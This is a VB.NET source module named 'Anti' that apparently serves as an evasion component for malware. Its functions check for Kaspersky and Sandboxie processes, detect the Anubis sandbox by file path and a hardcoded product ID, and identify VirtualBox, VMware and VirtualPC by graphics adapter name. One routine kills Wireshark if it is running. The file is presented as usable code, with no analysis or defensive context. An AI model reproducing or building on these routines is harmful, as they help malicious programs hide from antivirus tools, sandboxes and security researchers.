Imports Microsoft.Win32

Module Anti
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Dim regPID As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
    Dim pid As Object = regPID.GetValue("ProductId")
    Dim id As String = "76487-337-8429955-22614"

    Public Function antiKAV() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("avp").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function
    Private Sub AntiWireShark()

        Dim ProcessList As System.Diagnostics.Process()

        ProcessList = System.Diagnostics.Process.GetProcesses()

        Dim Proc As System.Diagnostics.Process

        Dim title As String

        For Each Proc In ProcessList
            title = Proc.MainWindowTitle
            If (String.Equals(title, "The Wireshark Network Analyzer")) Then

                Proc.Kill()

            End If
        Next
    End Sub
    Public Function antiSandboxie() As Boolean
        On Error GoTo error1
        If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function antiAnubis() As Boolean
        On Error GoTo error1
        Dim folder As String = Application.StartupPath
        Dim getFile As String = folder & "\sample.exe"
        If Application.ExecutablePath = getFile Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function antiAnubis2() As Boolean
        On Error GoTo error1
        If pid = id Then
            Return True
        Else
            Return False
        End If
        Exit Function
error1:
        End
    End Function

    Public Function AntiVirtualBox() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VirtualBox Graphics Adapter"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function AntiVmWare() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VMware SVGA II"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Public Function AntiVirtualPC() As Boolean
        On Error GoTo error1
        Call getDevices()

        Select Case Grafikadapter
            Case "VM Additions S3 Trio32/64"
                Return True
            Case Else
                Return False
        End Select
        Exit Function
error1:
        End
    End Function

    Private Sub getDevices()
        On Error GoTo error1
        Devices = GetObject("winmgmts:").ExecQuery(RegionA)
        For Each AdaptList In Devices
            Grafikadapter = AdaptList.Description
        Next
        Exit Sub
error1:
        End
    End Sub
End Module